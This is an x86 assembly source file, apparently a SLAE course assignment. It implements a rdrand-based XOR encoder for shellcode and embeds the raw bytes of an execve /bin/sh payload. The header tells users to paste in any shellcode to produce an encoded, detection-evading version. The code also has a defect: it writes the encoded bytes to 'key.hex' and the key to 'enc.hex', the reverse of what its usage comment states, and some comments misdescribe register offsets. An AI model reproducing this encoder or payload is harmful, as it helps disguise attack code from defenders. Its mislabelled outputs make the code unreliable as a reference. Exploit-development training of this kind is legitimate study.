;
; Student ID:SLAE-860
; Assignment 4 - Custom Encoder
; Usage:  1.  Paste shellcode into "RawShellcode", compile and run with no arguments
;               Three files should be output:  raw.hex, enc.hex, and key.hex
;                   raw.hex = your original shellcode
;                   key.hex = the rdrand-generated key
;                   enc.hex = your encoded shellcode



global _start
section .text

writefile:
        push ebp
        mov ebp, esp
        mov eax, 5              ; Syscall number for OPEN()
        mov ebx, edi            ; Get to the previous EDI which is 8 bytes away
        mov ecx, 0101o          ; Octal code for O_CREAT, O_WRONLY, O_EXCL flags
        mov edx, 0666o          ; Octal code to set permissions
        int 0x80                ; Execute the syscall
        test eax, eax           ; Check for negative value
        js short error          ; If syscall returned negative value, jump to err label
        mov ebx, eax            ; Save the file descriptor into ebx
        mov eax, 0x4            ; Syscall number for WRITE()
        mov ecx, esi            ; Get to the previous ESI which is 12 bytes away
        mov edx, Rlen           ; Rlen should refer to the length of both Key and RawShellcode
        int 0x80                ; Execute the syscall
        test eax, eax           ; Check for negative value
        js short error
        mov eax, 0x76           ; Syscall number for FSYNC()
        int 0x80                ; ebx should still have the file descriptor
        test eax, eax
        js short error
        mov eax, 0x6            ; Syscall number for CLOSE()
        int 0x80                ; Close the open file descriptor in ebx
        mov esp, ebp
        pop ebp
        ret
error:
        mov eax, 0x4
        mov ebx, 0x1
        mov ecx, errmsg
        mov edx, errlen
        int 0x80
        mov eax, 0x1
        mov ebx, 0x1
        int 0x80                ; Indicate Abnormal exit
cleanup:
        mov eax, 0x1
        mov ebx, 0x0
        int 0x80                ; Execute EXIT() syscall
_start:
        lea esi, [RawShellcode] ; ESI is a pointer to RawShellcode
        mov edi, rawfile
        call writefile
        lea ebx, [Key]          ; EBX is a pointer to the memory reserved for the key
        mov ecx, Rlen           ; ECX is counter for # of RawShellcode bytes
        jmp short step1
step1:
        rdrand edx              ; If random, carry flag should be set
        jc short step2          ; Random bytes, thus move on
        jmp short step1         ; Not random bytes, try again
step2:
        test dl, dl             ; Test DL to make sure RDRAND didn't select a null
        je short step1          ; Jumps back to step1 if the last byte is a null
        jmp short step3         ; Last byte isn't null, move to step 3
step3:
        xor eax, eax
        mov al, dl              ; Move the now-valid key byte into AL for XOR oper.
        xor al, byte [esi]      ; AL now has the XOR'ed byte, need to check for zero.
        jz short step1
        mov byte [ebx], dl      ; Store first byte of key
        mov byte [esi], al      ; Replace raw byte with XOR'ed byte
        inc esi
        inc ebx
        loop step1              ; Repeat Step 1 - 3 for each byte
        mov edi, keyfile
        lea esi, [RawShellcode]
        call writefile
        mov edi, encfile
        lea esi, [Key]
        call writefile
        call cleanup

section .data                   ; RawShellcode is our good friend, the execve-stack shellcode
        RawShellcode:   db 0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80
        Rlen            equ $-RawShellcode
        keyfile:        db 'key.hex', 0
        rawfile:        db 'raw.hex', 0
        encfile:        db 'enc.hex', 0
        errmsg:         db 'Syscall failed! Exiting...', 0xA, 0x0
        errlen          equ $-errmsg
section .bss
        Key:            resb Rlen  ; Key and Shellcode must be the same size as each byte is encoded
                                   ; with a new pseudorandom byte via rdrand.
